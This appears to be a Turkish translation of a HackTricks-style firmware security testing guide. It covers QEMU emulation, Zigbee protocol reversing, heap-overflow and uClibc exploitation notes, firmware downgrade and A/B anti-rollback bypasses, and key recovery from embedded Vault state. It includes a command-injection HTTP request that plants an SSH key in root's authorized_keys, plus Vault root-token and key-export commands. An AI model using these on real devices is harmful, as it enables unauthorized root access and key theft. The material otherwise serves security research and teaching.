Analist QEMU kernel'ini, initramfs'i ve sanal diskleri kontrol ediyorsa, sağlayıcının doğrulama amaçlı PID 1'i küçük, statik olarak linklenmiş bir init ile değiştirerek değiştirilmiş bir root açılabilir. Bu bir **lab ortamında boot chain değiştirmedir**; dm-verity'nin, RSA imzasının, Secure Boot'un veya TPM ile mühürlenmiş bir anahtarın kırılması değildir.<sup>[[11]](#references)</sup>

Yedek init, özgün açılış yolunun operasyonel adımlarını taklit etmelidir: `devtmpfs`'i mount etmek, `setsid()` çağırmak, `/dev/console`'ı 0–2 dosya tanımlayıcılarına bağlamak, `/proc` ve `/sys`'i mount etmek, sağlanan block device'ı beklemek, düzenlenmiş root'u salt okunur olarak mount etmek, eski root'un pseudo-filesystem'lerini ayırmak, yeni mount'u `/` üzerine taşımak, `chroot` yapmak ve firmware'in özgün `/sbin/init` dosyası için `execve()` çağırmak. `MS_MOVE` işleminden **önce** `/dev`, `/proc` ve `/sys`'i ayırmak, yeni root'a ait mount point'lerin yanlışlıkla ayrılmasını önler.<sup>[[11]](#references)</sup>

Değiştirilebilir device durumunu değiştirilmiş, değişmez root'tan ayrı tutun. Bir qcow2 overlay, özgün diskin LVM durumunu korurken ikinci bir salt okunur virtio disk düzenlenmiş SquashFS'i sağlayabilir:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Çevrimdışı image durumu hata ayıklama

Yavaş açılışlar, yıkıcı başlangıç betikleri veya güvenilir olmayan konsol günlükleri hatanın kaynağını belirsizleştirdiğinde, guest dışındaki kalıcı durumu inceleyin. Çalışan bir VM'nin kullandığı overlay'i asla bağlamayın; `qemu-nbd` ile erişime açın, LVM keşfini hedeflenen NBD bölümüne kısıtlayın ve bağlantıyı kesmeden önce volume group'u devre dışı bırakın.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Tekrarlanabilir hata yalıtımı için, zaman damgalı işaretçi dosyalarını yazılabilir ve sabit bir birime yazın ve bunları çevrimdışı olarak doğrulayın; `/dev/kmsg`, FIFO’lar ve geçici konsollar, hız sınırlaması veya süreçlerin erken sonlanması nedeniyle yanlış negatif sonuçlar üretebilir. İlgisiz kodu değiştirmeden önce katmanlar arasındaki arayüzleri de birebir karşılaştırın: `uname -r` ile `/lib/modules/`, diskteki ext4 özellikleri ile kernel yapılandırması ve Mesa `libGL` nesli ile DRI driver ABI’si ve PCI’dan türetilen driver adları. Bir bileşen mevcut olabilir, hatta `dlopen()` ile başarıyla yüklenebilir; ancak tüketicisi farklı bir ABI beklediği için kullanılamaz durumda kalabilir.<sup>[[11]](#references)</sup>

## Pratikte Dinamik Analiz

Bu aşamada analiz için gerçek veya emüle edilmiş bir cihaz ortamı kullanılır. OS ve filesystem’e shell erişimini sürdürmek çok önemlidir. Emülasyon donanım etkileşimlerini kusursuz biçimde taklit etmeyebilir; bu nedenle zaman zaman emülasyonu yeniden başlatmak gerekebilir. Analiz sırasında filesystem yeniden incelenmeli, açığa çıkmış web sayfaları ve ağ servisleri exploit edilmeli ve bootloader güvenlik açıkları araştırılmalıdır. Olası backdoor güvenlik açıklarını belirlemek için firmware bütünlük testleri kritik önem taşır.

## Runtime Analiz Teknikleri

Runtime analizi, breakpoint ayarlamak ve fuzzing gibi tekniklerle güvenlik açıklarını belirlemek için gdb-multiarch, Frida ve Ghidra gibi araçlar kullanarak bir süreç veya binary ile çalışma ortamında etkileşim kurmayı içerir.

Tam bir debugger bulunmayan embedded hedeflerde, cihaza **statik bağlantılı bir `gdbserver` kopyalayın** ve uzak bağlantıyla bağlanın:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor mesaj eşlemesi

IoT hub’larda RF stack’i genellikle bir **radio MCU** ile Linux userland process’i arasında bölünür. Yararlı bir iş akışı, yolu eşlemektir:<sup>[[8]](#references)</sup>

1. Havadaki **RF frame**
2. Radio MCU’daki **controller-side parser**
3. Linux’a iletilen **serial/UART text veya TLV protocol** (örneğin `/dev/tty*`)
4. Ana daemon’daki **application dispatcher**
5. **Protocol-specific handler / state machine**

Bu mimari, tek bir hedef yerine iki reversing hedefi oluşturur. Controller, binary radio frame’lerini `Group,Command,arg1,arg2,...` gibi bir text protocol’e dönüştürüyorsa şunları ortaya çıkarın:

- **Message group**’ları ve dispatch table’ları
- Hangi mesajların **network**’ten, hangilerinin controller’ın kendisinden gelebileceği
- Tam **manufacturer-specific discriminator field**’ları (örneğin Zigbee `manufacturer_code` ve özel `cluster_command`)
- Yalnızca **commissioning**, discovery veya firmware/model indirme aşamalarında erişilebilen handler’lar

Özellikle Zigbee için pairing trafiğini yakalayın ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09` değerine bağlı olup olmadığını kontrol edin. Öyleyse commissioning trafiğini sniff etmek **Network Key**’i açığa çıkarabilir. Zigbee 3.0 install code’ları bu riski azaltır; bu nedenle test edilen cihazın bunları gerçekten zorunlu kılıp kılmadığını not edin.

### Manufacturer-specific protocol handler’ları ve FSM ile kısıtlanan erişilebilirlik

Vendor-specific Zigbee/ZCL komutları, standart cluster’lardan genellikle daha iyi bir hedeftir; çünkü bunlar daha az sınanmış validation içeren **özel parsing code**’u ve dahili **FSM**’leri besler.<sup>[[8]](#references)</sup>

Uygulanabilir iş akışı:

- **Vendor-only handler**’ı bulana kadar command dispatcher’ı reverse edin.
- **FSM state**, **event**, **check**, **action** ve **next-state** table’larını ortaya çıkarın.
- Otomatik ilerleyen **transitional state**’leri ve sonunda attacker-controlled state’i resetleyen ya da serbest bırakan retry/error branch’lerini belirleyin.
- Hatalı handler’ın her zaman erişilebilir olduğunu varsaymak yerine, daemon’ı savunmasız duruma getirmek için gereken meşru protocol alışverişlerini doğrulayın.

Zamanlamaya duyarlı protocol’lerde, Python framework’üyle packet replay yapmak çok yavaş olabilir. Daha güvenilir bir yöntem, doğru **endpoint**’leri, **attribute**’ları ve commissioning zamanlamasını sunabilmek için vendor-grade bir stack kullanarak gerçek donanımda (örneğin **nRF52840**) meşru bir cihazı emüle etmektir.

### Embedded daemon’larda parçalı indirme hatası sınıfı

Firmware’de tekrarlanan bir hata sınıfı, **parçalı blob/model/configuration indirmelerinde** görülür:<sup>[[8]](#references)</sup>

1. **İlk fragment** (`offset == 0`), `ctx->total_size` değerini kaydeder ve `malloc(total_size)` ile bellek ayırır.
2. Sonraki fragment’ler yalnızca `packet_total_size >= offset + chunk_len` gibi attacker-controlled **packet-local** alanlarını doğrular.
3. Kopyalama işlemi, **ilk ayrılan boyuta** karşı kontrol yapmadan `memcpy(&ctx->buffer[offset], chunk, chunk_len)` kullanır.

Bu, saldırganın şunları göndermesini sağlar:

- Küçük bir heap allocation’a zorlamak için **küçük** bir bildirilmiş total size içeren, ilk ve geçerli bir fragment.
- **Beklenen offset** değerine, ancak daha büyük `chunk_len` değerine sahip sonraki bir fragment.
- Yeni kontrolleri geçerken ilk ayrılan buffer’ı taşıran, sahte bir packet-local size.

Savunmasız yol commissioning logic’in arkasındaysa, saldırıdan önce hedefi beklenen model-download veya blob-download durumuna getirecek yeterli **device emulation** da gerekir.

### Protocol ile tetiklenen `free()`

Embedded daemon’larda heap metadata exploitation’ı tetiklemenin en kolay yolu çoğu zaman “cleanup’ı beklemek” değil, **protocol’ün kendi error handling’ini zorlamaktır**:<sup>[[8]](#references)</sup>

- FSM’i **retry** veya **error** durumlarına sokmak için hatalı follow-up fragment’ler gönderin.
- Retry threshold’unu aşarak daemon’ın **context’i resetlemesini** ve bozulmuş buffer’ı serbest bırakmasını sağlayın.
- Process başka nedenlerle çökmeden önce allocator tarafındaki primitive’leri tetiklemek için bu öngörülebilir `free()` işlemini kullanın.

Bu yöntem, özellikle embedded Linux’taki **musl/uClibc/dlmalloc benzeri** allocator’lara karşı kullanışlıdır; burada chunk metadata’yı bozmak, unlink/unbin logic’ini bir write primitive’e dönüştürebilir. Kararlı bir yöntem, gerçek bin pointer’larını hemen bozup process’i çökertmek yerine, allocator traversal’ı **taşan buffer’ın içine yerleştirilmiş fake chunk**’lara yönlendirecek şekilde bir **size field**’ı bozmaktır.

## Binary exploitation ve Proof-of-Concept

Belirlenen vulnerability’ler için PoC geliştirmek, hedef mimarisini derinlemesine anlamayı ve düşük seviyeli dillerde programlama yapmayı gerektirir. Embedded sistemlerde binary runtime protection’lar nadirdir; ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekebilir.

### uClibc fastbin exploitation notları (embedded Linux)

- **Fastbin’ler + birleştirme:** uClibc, glibc’ye benzer fastbin’ler kullanır. Daha sonraki büyük bir allocation `__malloc_consolidate()` işlevini tetikleyebilir; bu nedenle her fake chunk kontrolleri geçebilmelidir (geçerli size, `fd = 0` ve çevresindeki chunk’ların "in use" olarak görülmesi).<sup>[[6]](#references)</sup>
- **ASLR altında non-PIE binary’ler:** ASLR etkin olsa bile ana binary **non-PIE** ise, binary içindeki `.data/.bss` adresleri sabittir. Fastbin allocation’ı bir **function pointer table**’a yönlendirmek için geçerli bir heap chunk header’ına benzeyen bir bölgeyi hedefleyebilirsiniz.
- **Parser’ı durduran NUL:** JSON parse edilirken payload içindeki bir `\x00`, trailing attacker-controlled byte’ları stack pivot/ROP chain için korurken parsing’i durdurabilir.
- **`/proc/self/mem` ile shellcode:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağıran bir ROP chain, bilinen bir mapping’e çalıştırılabilir shellcode yerleştirip oraya atlayabilir.

## Firmware analizi için hazırlanmış işletim sistemleri

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi işletim sistemleri, gerekli araçlarla donatılmış, firmware security testing için önceden yapılandırılmış ortamlar sunar.

## Firmware analizi için hazırlanmış işletim sistemleri

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının security assessment ve penetration testing işlemlerini yapmanıza yardımcı olmak üzere tasarlanmış bir distro’dur. Gerekli tüm araçların yüklü olduğu, önceden yapılandırılmış bir ortam sunarak size zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing araçları önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing işletim sistemi.

## Firmware downgrade saldırıları ve güvensiz update mekanizmaları

Bir vendor firmware image’ları için cryptographic signature check’leri uygulasa bile, **version rollback (downgrade) koruması sıklıkla atlanır**. Boot- veya recovery-loader, yalnızca embedded public key ile signature’ı doğruluyor ancak flash edilen image’ın *version*’ını (veya monotonik bir counter’ı) karşılaştırmıyorsa, saldırgan **geçerli bir signature taşıyan eski ve savunmasız firmware’i** meşru şekilde yükleyerek yamalanmış vulnerability’leri yeniden ortaya çıkarabilir.<sup>[[4]](#references)</sup>

Tipik saldırı iş akışı:

1. **Daha eski, imzalı bir image edinin**
   * Vendor’ın herkese açık download portal’ından, CDN’inden veya support site’ından alın.
   * Companion mobile/desktop application’lardan çıkarın (ör. Android APK içindeki `assets/firmware/`).
   * VirusTotal, Internet archive’leri, forumlar vb. üçüncü taraf repository’lerden edinin.
2. Image’ı, açık bir update channel üzerinden cihaza **yükleyin veya cihaza sunun**:
   * Web UI, mobile-app API, USB, TFTP, MQTT vb.
   * Birçok tüketici IoT cihazı, Base64 ile kodlanmış firmware blob’larını kabul eden, bunları server-side çözen ve recovery/upgrade işlemini başlatan *kimlik doğrulamasız* HTTP(S) endpoint’leri sunar.
3. Downgrade işleminden sonra, daha yeni sürümde yamalanmış bir vulnerability’yi exploit edin (örneğin sonradan eklenmiş bir command-injection filter’ı).
4. Persistence sağlandıktan sonra tespit edilmemek için isteğe bağlı olarak en güncel image’ı yeniden flash edin veya update’leri devre dışı bırakın.

### Örnek: Downgrade sonrası Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Savunmasız (daha eski sürüme düşürülmüş) firmware'de `md5` parametresi herhangi bir temizleme yapılmadan doğrudan bir shell komutuna ekleniyor ve böylece rastgele komutların enjekte edilmesine olanak tanıyor (burada SSH anahtar tabanlı root erişimini etkinleştirmek için). Daha sonraki firmware sürümlerinde temel bir karakter filtresi eklendi, ancak sürüm düşürme korumasının olmaması bu düzeltmeyi etkisiz kılıyor.<sup>[[4]](#references)</sup>

### Mobil Uygulamalardan Firmware Çıkarma

Birçok üretici, uygulamanın cihazı Bluetooth/Wi-Fi üzerinden güncelleyebilmesi için tam firmware imajlarını yardımcı mobil uygulamalarına ekliyor. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi yollarda şifrelenmeden saklanıyor. `apktool`, `ghidra` ve hatta basit bir `unzip` gibi araçlar, fiziksel donanıma dokunmadan imzalı imajları çıkarmanıza olanak tanıyor.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot tasarımlarında yalnızca updater tarafındaki anti-rollback bypass

Bazı vendor'lar anti-downgrade **ratchet** uygular, ancak bunu yalnızca *updater* mantığı içinde yapar (örneğin CAN üzerinden bir UDS rutini, recovery komutu veya userspace OTA agent). **Bootloader** daha sonra yalnızca image signature/CRC kontrolü yapıp partition table'a veya slot metadata'sına güveniyorsa rollback koruması yine bypass edilebilir.<sup>[[7]](#references)</sup>

Tipik zayıf tasarım:

- Firmware metadata'sı hem bir version descriptor hem de bir **security ratchet** / monotonic counter içerir.
- Updater, image ratchet değerini kalıcı depolamadaki bir değerle karşılaştırır ve daha eski, imzalı image'ları reddeder.
- Bootloader bu ratchet'ı **parse etmez**; önyükleme öncesinde yalnızca header, CRC ve signature doğrulaması yapar.
- Slot etkinleştirme bilgisi ayrı olarak bir partition table'da veya slot başına generation counter'da tutulur ve doğrulanan firmware'in tam digest değerine **cryptographic olarak bağlanmaz**.

Bu, dual-slot sistemlerde **bir image'ı doğrula / başka bir image'ı önyükle** primitive'ini oluşturur. Saldırgan, updater'a güncel imzalı bir image kullanarak B slotunu sonraki önyükleme hedefi olarak işaretletebilir ve ardından yeniden başlatmadan önce B slotunun üzerine yazabilirse, bootloader yalnızca önceden kaydedilmiş slot metadata'sına güvendiğinden eski image'ı yine de önyükleyebilir.

Yaygın kötüye kullanım yöntemi:

1. **Güncel, imzalı** bir firmware'i pasif slota yükleyin ve normal doğrulama/switch rutinini çalıştırarak layout'un bu slotu sonraki etkin slot olarak işaretlemesini sağlayın.
2. **Henüz yeniden başlatmayın**. Aynı oturumda slot hazırlama/silme rutinine yeniden girin.
3. Updater'ın az önce etkinleştirdiği **aynı fiziksel slotu** silmesini sağlamak için eski boot-state veya eski slot-selection mantığını kötüye kullanın.
4. Bu slota **daha eski ama hâlâ imzalı** bir firmware yazın.
5. Ratchet'ı uygulayan doğrulama rutinini atlayın ve doğrudan yeniden başlatın.
6. Bootloader etkinleştirilmiş slotu seçer, yalnızca signature/integrity kontrolü yapar ve eski image'ı önyükler.

A/B update implementasyonlarını reverse ederken dikkat edilecek noktalar:

- Slot seçiminin başarılı bir switch işleminden sonra yenilenmeyen **boot-time flag'lerden** türetilmesi.
- `prepare_passive_slot()` benzeri bir rutinin, **geçerli kayıtlı layout** yerine eski duruma göre slot silmesi.
- `part_write_layout()` benzeri bir fonksiyonun doğrulanmış image hash'ini kaydetmeden yalnızca **generation counter** / active flag değerini artırması.
- Ratchet kontrollerinin userspace veya updater kodunda uygulanıp ROM / bootloader / secure boot aşamalarında **uygulanmaması**.
- İçeriği silinip yeniden yazıldıktan sonra bile slotu önyüklenebilir olarak işaretli bırakan silme veya recovery rutinleri.

### Update Logic Değerlendirme Kontrol Listesi

* *Update endpoint*'inin transport/authentication mekanizması yeterince korunuyor mu (TLS + authentication)?
* Cihaz, flash işleminden önce **version number'ları** veya **monotonic anti-rollback counter** değerini karşılaştırıyor mu?
* Image, secure boot chain içinde doğrulanıyor mu (ör. signature'lar ROM kodu tarafından kontrol ediliyor mu)?
* **Bootloader**, yalnızca signature/CRC kontrolü yapmak yerine updater ile aynı ratchet'ı uygulıyor mu?
* Slot etkinleştirme metadata'sı **doğrulanmış firmware digest/version değerine bağlı mı**, yoksa slot etkinleştirildikten sonra değiştirilebilir mi?
* Slot switch başarılı olduktan sonra cihaz yeniden başlatılmaya zorlanıyor mu, yoksa aynı oturumda daha sonraki update/silme rutinlerine hâlâ erişilebiliyor mu?
* Userland kodu ek sanity check'ler (ör. izin verilen partition map, model number) yapıyor mu?
* *Partial* veya *backup* update akışları aynı doğrulama mantığını tekrar kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse platform muhtemelen rollback saldırılarına karşı savunmasızdır.

## Pratik yapmak için savunmasız firmware'ler

Firmware'deki zafiyetleri keşfetme pratiği yapmak için aşağıdaki savunmasız firmware projelerini başlangıç noktası olarak kullanın.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state içinden firmware decryption key'lerini kurtarma

Bir update image'ı az miktarda plaintext metadata ile büyük, yüksek entropili bir blob'u bir arada içeriyorsa, brute-force denemeden önce container triage yapın:<sup>[[1]](#references)</sup>

- Header'ları, offset'leri ve satır sınırlarını `hexdump`, `xxd`, `strings -tx`, `base64 -d` ve `binwalk -E` ile dökün.
- `Salted__` genellikle OpenSSL `enc` formatını belirtir: sonraki 8 byte salt, kalan byte'lar ise ciphertext'tir.
- Tam olarak `256` byte'a çözümlenen bir Base64 alanı, rastgele bir firmware password/session key'i sarmalayan RSA-2048 ciphertext'ine işaret eder.
- Aynı dosyadaki detached PGP materyali genellikle yalnızca authenticity sağlar; bunun confidentiality mekanizması olduğunu varsaymayın.

Statik key araması (`grep`, `strings`, PEM/PGP aramaları) başarısız olursa, yalnızca private key'leri aramak yerine **operational decrypt path**'i reverse edin:

- Updater / management binary'sini decompile edin ve şifrelenmiş blob'u kimin okuduğunu, hangi helper/API'nin onu çözdüğünü ve hangi mantıksal key name'i istediğini izleyin.
- Çıkarılan root filesystem'de KMS state'i (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) ve ayrıca unit file'ları ile init script'lerini arayın.
- Plaintext `vault operator unseal ...`, recovery key'leri, bootstrap token'ları veya yerel KMS auto-unseal script'lerini private-key materyaliyle eşdeğer kabul edin.

Appliance orijinal Vault binary'sini ve storage backend'ini içeriyorsa, bu ortamı yeniden çalıştırmak genellikle Vault iç işleyişini yeniden uygulamaktan daha kolaydır:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Klonlanmış KMS üzerinde root yetkisiyle:

- Transit key'leri yalnızca izole klonda dışa aktarılabilir hâle getirin: `vault write transit/keys/<name>/config exportable=true`
- Unwrap key'i dışa aktarın: `vault read transit/export/encryption-key/<name>`
- Kurtarılan RSA key'ini, KMS'nin kullandığı tam padding/hash çiftiyle deneyin. PKCS#1 v1.5 decrypt işleminin ve varsayılan OAEP decrypt işleminin başarısız olması, key'in yanlış olduğunu **kanıtlamaz**; Vault destekli birçok akış SHA-256 ile OAEP kullanırken yaygın kütüphaneler varsayılan olarak SHA-1 kullanır.
- Payload `Salted__` ile başlıyorsa, AES-CBC decrypt işlemine geçmeden önce vendor'ın OpenSSL KDF'sini (`EVP_BytesToKey`, eski cihazlarda genellikle MD5) aynen yeniden uygulayın.

Bu, "encrypted firmware" sorununu daha genel bir probleme dönüştürür: **cihaz tarafındaki operasyonel key'leri kurtarın, ardından tam unwrap + KDF parametrelerini offline olarak yeniden uygulayın**.

## Eğitim ve Sertifikalar

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude ile Firmware Kırma: Kıdemli Seviyede Uzmanlık, Yeni Başlayan Seviyesinde Özerklik](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Güvenlik Testi Metodolojisi](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Pratik IoT Hacking: Nesnelerin İnternetine Saldırmak İçin Kesin Kılavuz](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Terk edilmiş donanımlarda zero-day açıklarını kullanma – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 Dolarlık Bir Akıllı Cihaz Bana Evinize Erişim Sağladı](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Şimdi mi Gördün: Artık Pwned'sin](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector'ı şarj portu konektöründen exploit etme - Bölüm 2: anti-downgrade korumasını atlatma](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Yanıp Sönmesini Sağla: Philips Hue Bridge'in Over-the-Air Exploitation'ı](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU'da ROOT Tesla OS Bölüm 1: Paketi Açma](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel belgeleri - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU'da ROOT Tesla OS Bölüm 2: Debugging ve Düzeltme](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Parolaları: Zayıf XOR Şifrelemesi SPI Flash'tan Kurtarmayı Mümkün Kılıyor (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS parola kurtarma araçları](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Donanım Hacking Becerilerini Tazeleme Bölüm 2](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
